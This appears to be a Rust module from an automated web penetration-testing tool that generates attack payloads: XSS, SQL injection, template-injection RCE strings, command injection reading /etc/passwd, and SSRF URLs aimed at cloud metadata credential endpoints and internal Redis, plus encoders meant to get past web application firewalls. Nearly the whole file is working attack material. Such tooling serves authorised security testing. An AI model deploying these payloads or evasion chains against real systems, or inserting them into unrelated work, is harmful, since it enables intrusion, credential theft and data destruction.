use std::fmt;

use aegis_protocol::defense_context::DefenseContext;
use aegis_protocol::finding::VulnerabilityClass;

/// A generated payload with metadata about its construction.
///
/// Each payload carries its raw string plus provenance: what encoding chain
/// produced it, what vulnerability class it targets, and what evasion
/// techniques it employs. This metadata lets the Brain reason about WHY
/// a payload might bypass a specific WAF.
#[derive(Debug, Clone)]
pub struct ForgedPayload {
    pub raw: String,
    pub vulnerability_class: VulnerabilityClass,
    pub encoding_chain: Vec<EncodingStep>,
    pub evasion_notes: Vec<String>,
    pub context: PayloadContext,
    pub bypass_target: Option<String>,
}

/// The injection context determines which characters must be escaped and
/// what syntax is valid. A payload valid in an HTML attribute context
/// differs from one valid in a JavaScript string context.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum PayloadContext {
    HtmlBody,
    HtmlAttribute,
    JavaScriptString,
    JavaScriptTemplate,
    UrlParameter,
    JsonValue,
    SqlString,
    SqlNumeric,
    CommandArgument,
    TemplateLiteral,
    HeaderValue,
    XmlContent,
    CssValue,
}

impl fmt::Display for PayloadContext {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::HtmlBody => write!(f, "html_body"),
            Self::HtmlAttribute => write!(f, "html_attribute"),
            Self::JavaScriptString => write!(f, "js_string"),
            Self::JavaScriptTemplate => write!(f, "js_template"),
            Self::UrlParameter => write!(f, "url_parameter"),
            Self::JsonValue => write!(f, "json_value"),
            Self::SqlString => write!(f, "sql_string"),
            Self::SqlNumeric => write!(f, "sql_numeric"),
            Self::CommandArgument => write!(f, "cmd_argument"),
            Self::TemplateLiteral => write!(f, "template_literal"),
            Self::HeaderValue => write!(f, "header_value"),
            Self::XmlContent => write!(f, "xml_content"),
            Self::CssValue => write!(f, "css_value"),
        }
    }
}

/// An encoding transformation applied to a payload.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum EncodingStep {
    UrlEncode,
    DoubleUrlEncode,
    HtmlEntityEncode,
    UnicodeEscape,
    Base64,
    HexEncode,
    UnicodeNormalization,
    CaseToggle,
    NullByteInject,
    WhitespaceSubstitution,
    CommentInsertion,
}

impl fmt::Display for EncodingStep {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::UrlEncode => write!(f, "url_encode"),
            Self::DoubleUrlEncode => write!(f, "double_url_encode"),
            Self::HtmlEntityEncode => write!(f, "html_entity"),
            Self::UnicodeEscape => write!(f, "unicode_escape"),
            Self::Base64 => write!(f, "base64"),
            Self::HexEncode => write!(f, "hex"),
            Self::UnicodeNormalization => write!(f, "unicode_norm"),
            Self::CaseToggle => write!(f, "case_toggle"),
            Self::NullByteInject => write!(f, "null_byte"),
            Self::WhitespaceSubstitution => write!(f, "whitespace_sub"),
            Self::CommentInsertion => write!(f, "comment_insert"),
        }
    }
}

/// Apply URL encoding to a string.
pub fn url_encode(input: &str) -> String {
    input
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.' || c == '~' {
                c.to_string()
            } else {
                format!("%{:02X}", c as u32)
            }
        })
        .collect()
}

/// Apply double URL encoding (encode the percent signs themselves).
pub fn double_url_encode(input: &str) -> String {
    url_encode(&url_encode(input))
}

/// Apply HTML entity encoding to special characters.
pub fn html_entity_encode(input: &str) -> String {
    input
        .chars()
        .map(|c| match c {
            '<' => "&#x3c;".to_string(),
            '>' => "&#x3e;".to_string(),
            '"' => "&#x22;".to_string(),
            '\'' => "&#x27;".to_string(),
            '&' => "&#x26;".to_string(),
            '/' => "&#x2f;".to_string(),
            _ => c.to_string(),
        })
        .collect()
}

/// Apply JavaScript Unicode escape sequences.
pub fn unicode_escape(input: &str) -> String {
    input
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() {
                format!("\\u{:04x}", c as u32)
            } else {
                c.to_string()
            }
        })
        .collect()
}

/// Toggle case for WAF bypass (e.g., `<ScRiPt>` instead of `<script>`).
pub fn case_toggle(input: &str) -> String {
    input
        .chars()
        .enumerate()
        .map(|(i, c)| {
            if i % 2 == 0 {
                c.to_uppercase().to_string()
            } else {
                c.to_lowercase().to_string()
            }
        })
        .collect()
}

/// Insert SQL comments between keywords to bypass pattern matching.
pub fn sql_comment_insert(input: &str) -> String {
    let keywords = [
        "SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP", "FROM", "WHERE", "AND", "OR",
    ];
    let mut result = input.to_string();
    for kw in &keywords {
        let commented = format!("/**/{}/**/", kw);
        result = result.replace(kw, &commented);
        let lower = kw.to_lowercase();
        let commented_lower = format!("/**/{}/**/", lower);
        result = result.replace(&lower, &commented_lower);
    }
    result
}

/// Generate XSS payloads for different injection contexts.
pub fn generate_xss_payloads(
    context: PayloadContext,
    defense: &DefenseContext,
) -> Vec<ForgedPayload> {
    let waf_blocks_xss = defense
        .waf_blocked_categories
        .contains(&VulnerabilityClass::CrossSiteScripting);

    let mut payloads = Vec::new();

    let base_payloads: Vec<(&str, PayloadContext)> = match context {
        PayloadContext::HtmlBody => vec![
            ("<img src=x onerror=alert(1)>", PayloadContext::HtmlBody),
            ("<svg/onload=alert(1)>", PayloadContext::HtmlBody),
            ("<details/open/ontoggle=alert(1)>", PayloadContext::HtmlBody),
            (
                "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
                PayloadContext::HtmlBody,
            ),
            (
                "<input onfocus=alert(1) autofocus>",
                PayloadContext::HtmlBody,
            ),
            ("<marquee onstart=alert(1)>", PayloadContext::HtmlBody),
            ("<video><source onerror=alert(1)>", PayloadContext::HtmlBody),
            ("<body onload=alert(1)>", PayloadContext::HtmlBody),
            (
                "<iframe srcdoc='<script>alert(1)</script>'>",
                PayloadContext::HtmlBody,
            ),
        ],
        PayloadContext::HtmlAttribute => vec![
            (
                "\" onfocus=alert(1) autofocus x=\"",
                PayloadContext::HtmlAttribute,
            ),
            (
                "' onfocus=alert(1) autofocus x='",
                PayloadContext::HtmlAttribute,
            ),
            (
                "\" onmouseover=alert(1) x=\"",
                PayloadContext::HtmlAttribute,
            ),
            ("javascript:alert(1)//", PayloadContext::HtmlAttribute),
            (
                "data:text/html,<script>alert(1)</script>",
                PayloadContext::HtmlAttribute,
            ),
        ],
        PayloadContext::JavaScriptString => vec![
            ("';alert(1)//", PayloadContext::JavaScriptString),
            ("\";alert(1)//", PayloadContext::JavaScriptString),
            (
                "</script><img src=x onerror=alert(1)>",
                PayloadContext::JavaScriptString,
            ),
            ("\\';alert(1)//", PayloadContext::JavaScriptString),
        ],
        PayloadContext::JavaScriptTemplate => vec![
            ("${alert(1)}", PayloadContext::JavaScriptTemplate),
            (
                "${constructor.constructor('alert(1)')()}",
                PayloadContext::JavaScriptTemplate,
            ),
        ],
        _ => vec![("<script>alert(1)</script>", PayloadContext::HtmlBody)],
    };

    for (base, ctx) in &base_payloads {
        payloads.push(ForgedPayload {
            raw: base.to_string(),
            vulnerability_class: VulnerabilityClass::CrossSiteScripting,
            encoding_chain: Vec::new(),
            evasion_notes: Vec::new(),
            context: *ctx,
            bypass_target: None,
        });

        if waf_blocks_xss {
            payloads.push(ForgedPayload {
                raw: case_toggle(base),
                vulnerability_class: VulnerabilityClass::CrossSiteScripting,
                encoding_chain: vec![EncodingStep::CaseToggle],
                evasion_notes: vec!["case alternation to bypass pattern matching".to_string()],
                context: *ctx,
                bypass_target: defense.waf_vendor.clone(),
            });

            payloads.push(ForgedPayload {
                raw: html_entity_encode(base),
                vulnerability_class: VulnerabilityClass::CrossSiteScripting,
                encoding_chain: vec![EncodingStep::HtmlEntityEncode],
                evasion_notes: vec!["HTML entity encoding to bypass WAF regex".to_string()],
                context: *ctx,
                bypass_target: defense.waf_vendor.clone(),
            });

            payloads.push(ForgedPayload {
                raw: double_url_encode(base),
                vulnerability_class: VulnerabilityClass::CrossSiteScripting,
                encoding_chain: vec![EncodingStep::DoubleUrlEncode],
                evasion_notes: vec!["double URL encoding for proxied decode".to_string()],
                context: *ctx,
                bypass_target: defense.waf_vendor.clone(),
            });
        }
    }

    payloads
}

/// Generate SQL injection payloads.
pub fn generate_sqli_payloads(
    context: PayloadContext,
    defense: &DefenseContext,
) -> Vec<ForgedPayload> {
    let waf_blocks_sqli = defense
        .waf_blocked_categories
        .contains(&VulnerabilityClass::SqlInjection);

    let mut payloads = Vec::new();

    let bases: Vec<&str> = match context {
        PayloadContext::SqlString => vec![
            "' OR 1=1--",
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SLEEP(5)--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "';WAITFOR DELAY '0:0:5'--",
        ],
        PayloadContext::SqlNumeric => vec![
            "1 OR 1=1",
            "1 UNION SELECT NULL",
            "1 AND 1=1",
            "1 AND 1=2",
            "1 AND SLEEP(5)",
            "1; SELECT pg_sleep(5)",
        ],
        _ => vec![
            "' OR 1=1--",
            "1 OR 1=1",
        ],
    };

    for base in &bases {
        payloads.push(ForgedPayload {
            raw: base.to_string(),
            vulnerability_class: VulnerabilityClass::SqlInjection,
            encoding_chain: Vec::new(),
            evasion_notes: Vec::new(),
            context,
            bypass_target: None,
        });

        if waf_blocks_sqli {
            payloads.push(ForgedPayload {
                raw: sql_comment_insert(base),
                vulnerability_class: VulnerabilityClass::SqlInjection,
                encoding_chain: vec![EncodingStep::CommentInsertion],
                evasion_notes: vec!["SQL comment insertion between keywords".to_string()],
                context,
                bypass_target: defense.waf_vendor.clone(),
            });

            payloads.push(ForgedPayload {
                raw: double_url_encode(base),
                vulnerability_class: VulnerabilityClass::SqlInjection,
                encoding_chain: vec![EncodingStep::DoubleUrlEncode],
                evasion_notes: vec!["double URL encoding".to_string()],
                context,
                bypass_target: defense.waf_vendor.clone(),
            });

            let mysql_bypass = base
                .replace("UNION", "/*!50000UNION*/")
                .replace("SELECT", "/*!50000SELECT*/")
                .replace("union", "/*!50000union*/")
                .replace("select", "/*!50000select*/");
            if mysql_bypass != *base {
                payloads.push(ForgedPayload {
                    raw: mysql_bypass,
                    vulnerability_class: VulnerabilityClass::SqlInjection,
                    encoding_chain: Vec::new(),
                    evasion_notes: vec![
                        "MySQL version comment bypass (/*!50000keyword*/)".to_string()
                    ],
                    context,
                    bypass_target: defense.waf_vendor.clone(),
                });
            }
        }
    }

    payloads
}

/// Generate SSTI payloads for common template engines.
pub fn generate_ssti_payloads() -> Vec<ForgedPayload> {
    let templates = vec![
        ("${{<%[%'\"}}%\\", "polyglot detection probe", PayloadContext::TemplateLiteral),
        ("{{7*7}}", "Jinja2/Twig arithmetic", PayloadContext::TemplateLiteral),
        ("${7*7}", "Freemarker/Velocity arithmetic", PayloadContext::TemplateLiteral),
        ("#{7*7}", "Thymeleaf/Ruby ERB arithmetic", PayloadContext::TemplateLiteral),
        ("<%= 7*7 %>", "EJS/ERB arithmetic", PayloadContext::TemplateLiteral),
        ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "Jinja2 RCE", PayloadContext::TemplateLiteral),
        ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "Twig RCE", PayloadContext::TemplateLiteral),
        ("<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "Freemarker RCE", PayloadContext::TemplateLiteral),
        ("<%= process.mainModule.require('child_process').execSync('id') %>", "EJS RCE", PayloadContext::TemplateLiteral),
        ("{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}", "Pug/Handlebars RCE", PayloadContext::TemplateLiteral),
    ];

    templates
        .into_iter()
        .map(|(raw, note, ctx)| ForgedPayload {
            raw: raw.to_string(),
            vulnerability_class: VulnerabilityClass::ServerSideTemplateInjection,
            encoding_chain: Vec::new(),
            evasion_notes: vec![note.to_string()],
            context: ctx,
            bypass_target: None,
        })
        .collect()
}

/// Generate command injection payloads.
pub fn generate_cmdi_payloads(defense: &DefenseContext) -> Vec<ForgedPayload> {
    let waf_active = defense.has_waf;

    let payloads = vec![
        ("; id", "semicolon separator"),
        ("| id", "pipe"),
        ("$(id)", "subshell"),
        ("`id`", "backtick"),
        ("& id", "background"),
        ("|| id", "or-chain"),
        ("\nid", "newline injection"),
        ("; sleep 5", "blind time-based"),
        ("| ping -c 5 127.0.0.1", "blind ICMP"),
    ];

    let mut result: Vec<ForgedPayload> = payloads
        .iter()
        .map(|(raw, note)| ForgedPayload {
            raw: raw.to_string(),
            vulnerability_class: VulnerabilityClass::CommandInjection,
            encoding_chain: Vec::new(),
            evasion_notes: vec![note.to_string()],
            context: PayloadContext::CommandArgument,
            bypass_target: None,
        })
        .collect();

    if waf_active {
        let ifs_payloads = vec![
            (";${IFS}id", "IFS as space replacement"),
            (";cat${IFS}/etc${IFS}/passwd", "IFS path traversal"),
            (";{cat,/etc/passwd}", "brace expansion"),
            (";cat</etc/passwd", "input redirect"),
            (";$(printf '\\x69\\x64')", "hex printf bypass"),
        ];
        for (raw, note) in ifs_payloads {
            result.push(ForgedPayload {
                raw: raw.to_string(),
                vulnerability_class: VulnerabilityClass::CommandInjection,
                encoding_chain: Vec::new(),
                evasion_notes: vec![format!("WAF bypass: {note}")],
                context: PayloadContext::CommandArgument,
                bypass_target: defense.waf_vendor.clone(),
            });
        }
    }

    result
}

/// Generate SSRF payloads targeting cloud metadata and internal services.
pub fn generate_ssrf_payloads() -> Vec<ForgedPayload> {
    let targets = vec![
        (
            "http://169.254.169.254/latest/meta-data/",
            "AWS metadata v1",
        ),
        (
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "AWS IAM creds",
        ),
        (
            "http://metadata.google.internal/computeMetadata/v1/",
            "GCP metadata",
        ),
        (
            "http://169.254.169.254/metadata/v1/",
            "DigitalOcean metadata",
        ),
        (
            "http://100.100.100.200/latest/meta-data/",
            "Alibaba metadata",
        ),
        ("http://169.254.170.2/v2/credentials", "AWS ECS task role"),
        ("http://127.0.0.1:6379/", "Redis internal"),
        ("http://127.0.0.1:11211/", "Memcached internal"),
        ("http://127.0.0.1:9200/", "Elasticsearch internal"),
        ("file:///etc/passwd", "file protocol"),
        (
            "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall",
            "gopher Redis",
        ),
        ("dict://127.0.0.1:6379/info", "dict Redis"),
        ("http://[::1]/", "IPv6 localhost"),
        ("http://0x7f000001/", "hex IP localhost"),
        ("http://0177.0.0.1/", "octal IP localhost"),
        ("http://127.1/", "short localhost"),
        ("http://2130706433/", "decimal IP localhost"),
    ];

    targets
        .into_iter()
        .map(|(raw, note)| ForgedPayload {
            raw: raw.to_string(),
            vulnerability_class: VulnerabilityClass::ServerSideRequestForgery,
            encoding_chain: Vec::new(),
            evasion_notes: vec![note.to_string()],
            context: PayloadContext::UrlParameter,
            bypass_target: None,
        })
        .collect()
}

/// Generate a full set of payloads for a vulnerability class, adapted to defenses.
pub fn forge_payloads(
    class: VulnerabilityClass,
    context: PayloadContext,
    defense: &DefenseContext,
) -> Vec<ForgedPayload> {
    match class {
        VulnerabilityClass::CrossSiteScripting => generate_xss_payloads(context, defense),
        VulnerabilityClass::SqlInjection => generate_sqli_payloads(context, defense),
        VulnerabilityClass::ServerSideTemplateInjection => generate_ssti_payloads(),
        VulnerabilityClass::CommandInjection => generate_cmdi_payloads(defense),
        VulnerabilityClass::ServerSideRequestForgery => generate_ssrf_payloads(),
        _ => Vec::new(),
    }
}

/// Apply an encoding chain to a payload string.
pub fn apply_encoding_chain(input: &str, steps: &[EncodingStep]) -> String {
    let mut result = input.to_string();
    for step in steps {
        result = match step {
            EncodingStep::UrlEncode => url_encode(&result),
            EncodingStep::DoubleUrlEncode => double_url_encode(&result),
            EncodingStep::HtmlEntityEncode => html_entity_encode(&result),
            EncodingStep::UnicodeEscape => unicode_escape(&result),
            EncodingStep::CaseToggle => case_toggle(&result),
            EncodingStep::CommentInsertion => sql_comment_insert(&result),
            EncodingStep::Base64 => {
                use base64::Engine;
                base64::engine::general_purpose::STANDARD.encode(result.as_bytes())
            }
            EncodingStep::HexEncode => result.bytes().map(|b| format!("\\x{:02x}", b)).collect(),
            EncodingStep::NullByteInject => format!("{}\x00", result),
            EncodingStep::WhitespaceSubstitution => result.replace(' ', "\t"),
            EncodingStep::UnicodeNormalization => result.replace('a', "\u{FF41}"),
        };
    }
    result
}

#[cfg(test)]
#[path = "payload_forge_test.rs"]
mod payload_forge_test;
